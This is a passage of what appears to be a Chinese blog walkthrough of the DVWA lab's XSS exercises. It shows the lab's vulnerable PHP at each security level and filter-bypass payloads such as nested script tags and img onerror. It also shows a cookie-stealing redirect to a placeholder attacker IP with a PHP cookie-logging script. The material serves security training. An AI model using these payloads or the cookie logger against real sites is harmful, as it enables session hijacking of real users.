class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//DOM Based Cross Site Scripting (XSS) Vulnerability</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( array_key_exists( <span class=\"string\">&quot;default&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; !is_null (<span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># White list the allowable languages</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;default&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;French&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;English&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;German&quot;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">&quot;Spanish&quot;</span>:</span><br><span class=\"line\">            <span class=\"comment\"># ok</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            header (<span class=\"string\">&quot;location: ?default=English&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( array_key_exists( <span class=\"string\">&quot;default&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; !is_null (<span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$default</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;default&#x27;</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># Do not allow script tags</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stripos (<span class=\"variable\">$default</span>, <span class=\"string\">&quot;&lt;script&quot;</span>) !== <span class=\"literal\">false</span>) &#123;</span><br><span class=\"line\">        header (<span class=\"string\">&quot;location: ?default=English&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Unknown Vulnerability Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># No protections, anything goes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-10\"><a class=\"markdownIt-Anchor\" href=\"#low-10\"></a> Low</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"medium-10\"><a class=\"markdownIt-Anchor\" href=\"#medium-10\"></a> Medium</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">option</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">select</span>&gt;</span>&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"high-10\"><a class=\"markdownIt-Anchor\" href=\"#high-10\"></a> High</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">English#<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\">alert(<span class=\"regexp\">/xss/</span>);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">#之后的被过滤，不传到服务端</span><br></pre></td></tr></table></figure>\n<h2 id=\"reflected-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#reflected-cross-site-scripting-xss\"></a> Reflected Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Reflected XSS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = htmlspecialchars( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = preg_replace( <span class=\"string\">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = str_replace( <span class=\"string\">&#x27;&lt;script&gt;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-11\"><a class=\"markdownIt-Anchor\" href=\"#low-11\"></a> Low</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(/xss/)&lt;/script&gt; </span><br><span class=\"line\">alert()\t confirm()\tprompt()</span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184310810.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184310810.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210428184310810\" /></p>\n<h3 id=\"medium-11\"><a class=\"markdownIt-Anchor\" href=\"#medium-11\"></a> Medium</h3>\n<ul>\n<li>嵌套过滤、大小写转换</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;scri&lt;script&gt;pt&gt;</span><br><span class=\"line\">&lt;ScrIpT&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>url编码</li>\n<li>通过诱导受害人点击页面隐藏提交name值，访问攻击网站的php脚本获取用户cookie，从而劫持会话。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;</span><br><span class=\"line\">需要进行url编码</span><br><span class=\"line\">%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E </span><br></pre></td></tr></table></figure>\n<ul>\n<li>将保存的cookie用于登录被攻击账户</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$cookie</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cookie&#x27;</span>];</span><br><span class=\"line\">file_put_contents(<span class=\"string\">&#x27;cookie.txt&#x27;</span>,<span class=\"variable\">$cookie</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-11\"><a class=\"markdownIt-Anchor\" href=\"#high-11\"></a> High</h3>\n<ul>\n<li>script被过滤</li>\n<li>使用其他标签</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;x&quot;</span> onerror=<span class=\"string\">&quot;alert(1)&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">onload</span>=<span class=\"string\">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184344293.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184344293.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210428184344293\" /></p>\n<p><img src=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184415013.png\" class=\"lazyload placeholder\" data-srcset=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184415013.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"image-20210428184415013\" /></p>\n<h2 id=\"stored-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#stored-cross-site-scripting-xss\"></a> Stored Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Stored XSS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = stripslashes( <span class=\"variable\">$message</span> );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = stripslashes( <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = htmlspecialchars( <span class=\"variable\">$name</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:message&#x27;</span>, <span class=\"variable\">$message</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:name&#x27;</span>, <span class=\"variable\">$name</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = strip_tags( addslashes( <span class=\"variable\">$message</span> ) );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = preg_replace( <span class=\"string\">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> 